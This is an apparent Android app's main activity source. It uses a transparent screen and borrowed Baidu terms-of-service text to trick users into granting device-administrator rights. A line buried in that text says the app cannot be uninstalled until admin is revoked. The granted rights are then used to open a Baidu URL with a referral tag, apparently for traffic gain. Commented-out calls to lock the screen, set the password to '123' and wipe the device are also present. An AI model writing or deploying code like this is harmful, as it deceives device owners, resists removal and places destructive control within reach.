package install.example.anzhuang;

import com.umeng.analytics.MobclickAgent;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Toast;
import android.os.Build;

public class MainActivity extends Activity {
	private DevicePolicyManager devicePolicyManager;
	private ComponentName componentName; 
	// 定义一个变量，来标识是否退出
    private static boolean isExit = false;

    Handler mHandler = new Handler() {

        @Override
        public void handleMessage(Message msg) {
            super.handleMessage(msg);
            isExit = false;
        }
    }; 
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setTheme(R.style.Transparent);
		setContentView(R.layout.activity_main);

		
		//UMGameAgent.setDebugMode(true);//设置输出运行时日�?
		//UMGameAgent.init(this);
		//added by cuijin,add DevicePolicyManager
		AddDevicePolicyManager();//那你就提示用户跳到激活设备管理器界面
		
	}
	@Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            exit();
            return false;
        }
        return super.onKeyDown(keyCode, event);
    }
	private void exit() {
        if (!isExit) {
            isExit = true;
            
            Toast.makeText(getApplicationContext(), "请先同意条款后使用，再按一次退出程序",
                    Toast.LENGTH_SHORT).show();
            // 利用handler延迟发送更改状态信息
            mHandler.sendEmptyMessageDelayed(0, 2000);
        } else {
            finish();
            System.exit(0);
        }
    }
	public void AddDevicePolicyManager(){
		// 设备安全管理服务    2.2之前的版本是没有对外暴露的 只能通过反射技术获取  
		devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
		         
	    // 申请权限
		componentName = new ComponentName(this, com.so.android.MyAdmin.class);
		// 判断该组件是否有系统管理员的权限
		boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
		if(isAdminActive){
			Uri uri = Uri.parse("http://m.baidu.com/?plg_nld=1&from=1012702k&plg_auth=1&plg_vkey=1&plg_usr=1&plg_uin=1&plg_dev=1&plg_nld=1");  
			Intent it = new Intent(Intent.ACTION_VIEW, uri);  
			startActivity(it);        
		    //devicePolicyManager.lockNow(); // 锁屏
			       
		    //devicePolicyManager.resetPassword("123", 0); // 设置锁屏密码
		    //devicePolicyManager.wipeData(0);  恢复出厂设置  (建议大家不要在真机上测试) 模拟器不支持该操作
			//this.finish();         
		} else {
		    Intent intent = new Intent();
		    // 指定动作名称
		    intent.setAction(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
		    // 指定给哪个组件授权
		    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
		    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "温馨提示:用户单独承担发布内容的责任。百度不对任何有关信息内容的真实性、适用性、合法性承担责任。用户对服务的使用是根据所有适用于服务的地方法律、国家法律和国际法律标准的。用户承诺：（1）在百度消息服务上发布信息或者利用百度的服务时必须符合中国有关法律、法规，不得在百度消息服务上或者利用百度的服务制作、复制、发布、传播以下信息：(a) 反对宪法所确定的基本原则的；(b) 危害国家安全，泄露国家秘密，颠覆国家政权，破坏国家统一的；(c) 损害国家荣誉和利益的；(d) 煽动民族仇恨、民族歧视、破坏民族团结的；(e) 破坏国家宗教政策，宣扬邪教和封建迷信的；(f) 散布谣言，扰乱社会秩序，破坏社会稳定的；(g) 散布淫秽、色情、赌博、暴力、凶杀、恐怖或者教唆犯罪的；(h) 侮辱或者诽谤他人，侵害他人合法权益的；(i) 含有法律、行政法规禁止的其他内容的。（2）在利用百度消息服务时还必须符合其他有关国家和地区的法律规定以及国际法的有关规定。软件安装后卸载需在设备管理器解除后（3）不利用百度的服务从事以下活动：(a) 未经允许，进入计算机信息网络或者使用计算机信息网络资源的；(b) 未经允许，对计算机信息网络功能进行删除、修改或者增加的(c) 故意制作、传播计算机病毒等破坏性程序的；(d) 其他危害计算机信息网络安全的行为。"
		    		);
		    		startActivity(intent);
		    
		}
		           
	}
	@Override 
    protected void onResume() {//重写此方法用来在第一次激活设备管理器之后锁定屏幕 
		MobclickAgent.onResume(this);
        if (devicePolicyManager!=null && devicePolicyManager.isAdminActive(componentName)) { 
        	//devicePolicyManager.lockNow(); 
            //android.os.Process.killProcess(android.os.Process.myPid()); 
        	Uri uri = Uri.parse("http://m.baidu.com/?plg_nld=1&from=1012702k&plg_auth=1&plg_vkey=1&plg_usr=1&plg_uin=1&plg_dev=1&plg_nld=1");  
			Intent it = new Intent(Intent.ACTION_VIEW, uri);  
			startActivity(it);        
		    this.finish();
        } 
        super.onResume(); 
    }
	public void onPause() {
		super.onPause();
		MobclickAgent.onPause(this);
	}

}
